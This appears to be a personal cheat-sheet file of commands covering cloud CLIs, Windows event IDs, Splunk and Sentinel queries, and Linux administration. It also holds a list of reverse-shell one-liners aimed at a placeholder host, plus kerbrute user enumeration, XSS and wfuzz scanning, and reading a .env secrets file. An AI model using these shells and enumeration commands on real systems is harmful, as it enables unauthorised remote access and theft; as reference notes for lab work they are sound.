



aws, aws ec2 create-route --route-table-id rtb-c1c8faa6 --destination-cidr-block 0.0.0.0/0 --gateway-id igw-1ff7a07b
aws, aws ec2 describe-route-tables --route-table-id rtb-c1c8faa6
aws, aws ec2 describe-route-tables --route-table-id rtb-c1c8faa6
aws, aws ec2 describe-subnets --filters "Name=vpc-id,Values=vpc-2f09a348" --query "Subnets[*].{ID:SubnetId,CIDR:CidrBlock}"
aws, aws ec2 associate-route-table  --subnet-id subnet-b46032ec --route-table-id rtb-c1c8faa6
aws, aws ec2 modify-subnet-attribute --subnet-id subnet-b46032ec --map-public-ip-on-launch
aws, aws ec2 create-key-pair --key-name MyKeyPair --query "KeyMaterial" --output text > MyKeyPair.pem
aws, aws ec2 create-security-group --group-name SSHAccess --description "Security group for SSH access" --vpc-id vpc-2f09a348
aws, aws ec2 authorize-security-group-ingress --group-id sg-e1fb8c9a --protocol tcp --port 22 --cidr 0.0.0.0/0
aws, aws ec2 describe-instances --instance-id i-0146854b7443af453 --query "Reservations[*].Instances[*].{State:State.Name,Address:PublicIpAddress}"

windowsID, Event ID 4697 , This event generates when new service was installed in the system.
windowsID, Event ID 106, This event is logged when the user registered the Task Scheduler task.
windowsID, Event ID 4702, This event generates when scheduled task was updated.
windowsID, Event ID 140,This event is logged when the time service has stopped advertising as a time source because the local machine is not an Active Directory Domain Controller.
widnowsID, Event ID 4699, A scheduled task was deleted.
widnowsID, Event ID 141, The time service has stopped advertising as a time source because there are no providers running.
windowsID, Event ID 201, This event is logged when the task scheduler successfully completed the task.
windowsID, Event ID 4697,A service was installed in the system.
windowsID, Event ID 7045,Created when new services are created on the local Windows machine.
windwosID, Event ID 7034,The service terminated unexpectedly.
windowsID, Event ID 7036,The Windows Firewall/Internet Connection Sharing (ICS) service entered the stopped state or , The Print Spooler service entered the running state.
windowsID, Event ID 7040, The start type of the IPSEC services was chnaged from disabled to auto start.
windowsID, Event ID 1102, Whenever Windows Security audit log is cleared, event ID 1102 is logged.
windowsID, Event ID 104 , This event is logged when the log file was cleared.
windowsID, Event ID 4776, The domain controller attempted to validate the credentials for an account.
windowsID, Event ID 4771,This event is logged on domain controllers only and only failure instances of this event are logged ( Kerberos pre-authentication failed ).
windowsID, Event ID 4768, This event is logged on domain controllers only and both success and failure instances of this event are logged ( A Kerberos authentication ticket TGT ) was requested.
windowsID, Event ID 4769,Windows uses this event ID for both successful and failed service ticket requests ( A Kerberos service ticket was requested ).
windowsID, Event ID 4624 ,An account was successfully logged on.
windowsID, Event ID 4625, An account failed to log on.
windowsID, Event ID 4634 + 4647 , User initiated logoff/An account was logged off
windowsID, Event ID 4648, A logon was attempted using explicit credentials
windowsID, Event ID 4672,Special privileges assigned to new logon
windowsID, Event ID 4720, A user account was created
windowsID, Event ID 4722, A user account was enabled
windowsID, Event ID 4724, An attempt was made to reset an accounts password
windowsID, Event ID 4728/4732/4756, group membership changes.
windowsID, Event ID 5140,A network share object was accessed
windowsID, Event ID 5145, Network share object was checked to see whether client can be granted desired access.
windowsID, Event ID 4657, A registry value was modified
widnowsID, Event ID 4688, A new process has been created.
windowsID, Event ID 4663, An attempt was made to access an object. - chyba jak kots czyta regedit registry sprawdzic.
windowsID, Event ID 4670, Permissions on an object were changed.
windowsID, Event ID 1, Process Create
windowsID, Evnet ID 12, Registry object added or deleted:
windowsID, Event ID 5154, The Windows Filtering Platform has permitted an application or service to listen on a port for incoming connections.
windowsID, Evnet ID 13, Registry value set:
windowsID, Evnet ID 3, Network connection detected
windowsID, Event ID 11, File created:
windowsID, Event ID 4103, Command line window
windowsID, Event ID 4688, process been crated but here we can find command line from cmd.
windowdID, Event ID 4103,to show all shell command
windowsID, Event ID 4738, A user account was changed.” This event is logged

kerbrute, /opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc win-services.services.local -d services.local user.lst

brim,  | count() by host
brim, _path=dce_rpc OR _path=smb_mapping OR _path=smb_files
brim, filename!=null -- to show all files
brim, _path=http | count() by uri | sort -r
brim, put total_bytes = orig_bytes + resp_bytes | top 10 total_bytes | cut id, orig_bytes, resp_bytes, total_bytes


iptables, sudo /sbin/iptables-save

xxs, dalfox http://marketing.nahamstore.thm/?error=


extra, cat /var/www/.env
extra, vnc nie ma usera

linux, setfacl -m u:username:rwx myfolder
linux, sudo usermod -a -G groupname username

splunk, | makeresults | eval cn = "3253-----2353----3253----3234" | rex max_match=0 field=cn "(?P<part>\d+)" | mvexpand  part | mvcombine part delim="-" | makemv part  -> gives one line with seperator
splunk, | rex mode=sed "y/134/XXX/" liczby 123 bede zamienione na X troche inny regular expression
splunk, | lookup    windows-event-id.csv EVENT_ID as EventCode  OUTPUT EVENT_DESCRIPTION   -> EventCode from search, Event_ID and Descrption from lookup  enrichment. 
GA



splunk, index=* EventCode=46*   | rename EventCode as EventID | search EventCode NOT   [ |inputlookup WL_EventID.csv| fields EventID ]  -> WL EventID field in the lookup blacklist for NOT [|inputlooup 
splunk, | eval category= case(_raw like "%session opened for user%","success", _raw like "%ailed password for%","failed")
splunk, EXTRACT-AttackVessel = ^\s+<AttackVessel>(?P<AttackVessel>[^<]+)
splunk, SEDCMD-bremovefooter = s/\<\/dataroot\>//g
splunk, REPORT-f = dream_attack
splunk, [dream_attack]  -> REGEX = (?m)^[^<]+.(.*?)\>([\S\s]*?)\<(?=[^\s])     FORMAT = $1::$2
splunk, sudo setfacl -m u:splunk:r /home/alice/.bash_history



sentinel, summarize -> stats
sentinel, project -> table
sentinel, about structure -> getschema
sentinel, change multivalue into raws -> | mv-expand a
sentinel, condition int the search; let timeframe =1d;, | where TimeGanarated> ago(timeframe) ;;;;   let Events = dynamic (["aaa","bbb"]); | where EventName in(Events)
sentinel, in~ Case Insensive Match
sentinel, has_any chech for whole terms not substrinds in the values
sentinel, contains search for substring
sentinel, let reg = @'.*db';       | extend mka=iff(name matches regex reg,"11111","000")
sentinel, | extend aaa = extract_all(@"sqlserver(?P<aaa>.*)",name)
sentinel, declare your own data let SecurityEVENT = datatable(BB: string, AA: string) [  "4545", @"mka111", "3443", @"kulczycki" ]; SecurityEVENT | where BB == "4545" |project AA
sentinel, _raw data |project pack_all()
setfacl, setfacl -m u:userA:rx folder
setfacl, setfacl -R -m u:userA:rX folder
setfacl, setfacl -d -m u::rw file -  Modify default ACL of a file for all users:
setfact, setfacl -x u:username file - remove 
setfacl, setfacl -b file Remove all ACL entries of a file:

shell, sh -i >& /dev/tcp/0.0.0.0/9000 0>&1
shell, 0<&196;exec 196<>/dev/tcp/0.0.0.0/9000; sh <&196 >&196 2>&196
shell, exec 5<>/dev/tcp/0.0.0.0/9000;cat <&5 | while read line; do $line 2>&5 >&5;  done
shell, sh -i 5<> /dev/tcp/0.0.0.0/9000 0<&5 1>&5 2>&5
shell, sh -i >& /dev/udp/0.0.0.0/9000 0>&1
shell, rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 0.0.0.0 9000 >/tmp/f
shell, nc 0.0.0.0 9000 -e sh
shell, nc.exe 0.0.0.0 9000 -e sh
shell, busybox nc 0.0.0.0 9000 -e sh
shell, nc -c sh 0.0.0.0 9000
shell, ncat 0.0.0.0 9000 -e sh
shell, ncat.exe 0.0.0.0 9000 -e sh
shell, rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 0.0.0.0 9000 >/tmp/f
shell, C='curl -Ns telnet://0.0.0.0:9000'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
shell, rcat connect -s sh 0.0.0.0 9000
shell, https://www.revshells.com/
shell, bash -c nohup bash -i >& /dev/tcp/0.0.0.0/9000 0>&1 &





powershell, Start-Process powershell -Verb runAs

bat, @echo off
bat, title This is your first batch script!
bat, echo Welcome to batch scripting!
bat, pause


wfuzz,  wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://testphp.vulnweb.com/
wfuzz,  wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200,202,204,301,302,307,403 http://example.com/uploads/FUZZ
wfuzz, wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100

update, cat /home/cat/Desktop/variable.txt   | bash
update, vi /home/cat/Desktop/variable.txt
update, sudo sed  -i s/10.10.182.225/1.1.1.1/g /data/pentest/knowlege_base.csv 

markdown, <img title="a ddddd" alt="Alt text" src="../images/table.png">
markdown, ![Alt text](../images/table.png)
markdown, ![Alt text](data:image/png;base64,herecode_base64)

docker, docker exec -it <mycontainer> sh
docker, docker cp CONTAINER:/var/logs/ /tmp/app_logs
docker, docker cp ./some_file CONTAINER:/work
docker, docker cp foo.txt container_id:/foo.txt
docker, docker run -d -p 8000:8000 -e "SPLUNK_START_ARGS=--accept-license" -e "SPLUNK_PASSWORD=<password>" --name splunk splunk/splunk:latest



audio, pulseaudio --start
audio, pulseaudio -k
audio, systemctl --user restart pipewire pipewire-pulse
audio, systemctl --user restart pipewire.socket pipewire-pulse.socket
audio, pactl info

es, etxkbmap us intl

azure, az login, Log in to Azure.
azure, az account list, List all subscriptions for your account.
azure, az account set --subscription "MySub", Set the active subscription.
azure, az account show, Show details of the current subscription.
azure, az configure, Set default arguments like location or group.
azure, az version, Show current version of Azure CLI and extensions.
azure, az upgrade, Upgrade Azure CLI to the latest version.
azure, az logout, Log out of Azure.
azure, az group create --name MyRG --location eastus, Create a new resource group.
azure, az group list, List all resource groups.
azure, az group delete --name MyRG, Delete a resource group.
azure, az tag create --resource-id /subscriptions/.../MyRG --tags Dept=Finance, Apply a tag to a resource.
azure, az resource list --resource-group MyRG, List all resources within a specific group.
azure, az resource move --destination-group NewRG --ids $id, Move a resource to another group.
azure, az vm create --resource-group MyRG --name MyVM --image Ubuntu2204, Create a Linux VM.
azure, az vm list --resource-group MyRG, List all VMs in a resource group.
azure, az vm start --name MyVM --resource-group MyRG, Start a stopped VM.
azure, az vm stop --name MyVM --resource-group MyRG, Stop a running VM.
azure, az vm restart --name MyVM --resource-group MyRG, Restart a VM.
azure, az vm delete --name MyVM --resource-group MyRG, Delete a VM.
azure, az vm show --name MyVM --resource-group MyRG, Get VM details.
azure, az vm extension set --resource-group MyRG --vm-name MyVM --name customScript, Install an extension.
azure, az aks create --resource-group MyRG --name MyAKS --node-count 3, Create an AKS cluster.
azure, az aks get-credentials --resource-group MyRG --name MyAKS, Connect to an AKS cluster.
azure, az network vnet create --resource-group MyRG --name MyVNet --address-prefix 10.0.0.0/16, Create a virtual network.
azure, az network nsg create --resource-group MyRG --name MyNSG, Create a Network Security Group.
azure, az network nsg rule create --nsg-name MyNSG --name AllowSSH --priority 1000, Add a rule to an NSG.
azure, az network public-ip create --resource-group MyRG --name MyPublicIP, Create a public IP address.
azure, az network dns zone create --resource-group MyRG --name "contoso.com", Create a DNS zone.
azure, az storage account create --name mystorageacct --resource-group MyRG --sku Standard_LRS, Create a storage account.
azure, az storage account list, List storage accounts.
azure, az storage container create --account-name mystorageacct --name mycontainer, Create a blob container.
azure, az storage blob upload --account-name mystorageacct --container-name mycontainer --name myfile.txt --file ./myfile.txt, Upload a file to blob storage.
azure, az storage account keys list --account-name mystorageacct, List access keys for a storage account.
azure, az keyvault create --name MyVault --resource-group MyRG, Create a Key Vault.
azure, az keyvault secret set --vault-name MyVault --name "MySecret" --value "Password123", Store a secret in Key Vault.
azure, az keyvault secret show --vault-name MyVault --name "MySecret", Retrieve a secret.
azure, az role assignment create --assignee user@domain.com --role Contributor --scope /subscriptions/..., Assign a role to a user.
azure, az ad user create --display-name "New User" --user-principal-name newuser@domain.com, Create an Azure AD user.
azure, az webapp create --resource-group MyRG --plan MyPlan --name MyApp --runtime "NODE:14LTS", Create a Web App.
azure, az webapp deployment source config --name MyApp --resource-group MyRG --repo-url <git_url>, Set up CI/CD for a Web App.
azure, az functionapp create --resource-group MyRG --name MyFunctionApp --storage-account mystorageacct, Create a Function App.
azure, az sql server create --resource-group MyRG --name mysqlserver --admin-user myadmin --admin-password Passw0rd, Create a SQL server.
azure, az sql db create --resource-group MyRG --server mysqlserver --name mydb --service-objective S0, Create a SQL database.
azure, az monitor metrics list --resource /subscriptions/.../MyVM --metric "Percentage CPU", Get metrics for a resource.
azure, az monitor activity-log list --resource-group MyRG, View the activity log for a resource group.
azure, az monitor diagnostic-settings create --resource MyVM --name settings --storage-account mystorageacct, Archive diagnostic logs.
azure, az resource show --name MyVM --resource-group MyRG --query "properties.provisioningState", Check a resource's provisioning state.
azure, az vm list --output table, Format output as a table.
azure, az vm list --query "[].name", Use JMESPath query to filter specific data.


